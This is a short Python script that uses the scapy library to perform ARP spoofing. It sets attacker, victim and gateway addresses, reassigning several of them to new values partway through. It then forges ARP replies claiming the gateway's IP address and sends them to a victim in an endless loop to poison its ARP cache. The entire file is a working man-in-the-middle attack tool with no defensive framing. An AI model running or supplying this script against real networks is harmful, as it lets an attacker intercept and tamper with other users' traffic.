#!/usr/bin/python

# Import scapy
from scapy.all import *

# Setting variables
attIP="10.0.0.231"
attMAC="00:14:38:00:00:01"
vicIP="10.0.0.209"
vicMAC="b8:ca:3a:aa:63:7d"
dgwIP="10.0.0.1"
dgwMAC="00:19:56:00:00:01"

attMAC="00:0c:29:1e:15:37"
vicIP="10.94.71.9"
dgwIP="10.94.71.254"
vicMAC ="b8:ca:3a:aa:63:7d"

# Forge the ARP packet
arpFake = ARP()
arpFake.op=2
arpFake.psrc=dgwIP
arpFake.pdst=vicIP
arpFake.hwdst=vicMAC

# While loop to send ARP
# when the cache is not spoofed
while True:

 # Send the ARP replies
 send(arpFake)
 print "ARP sent"

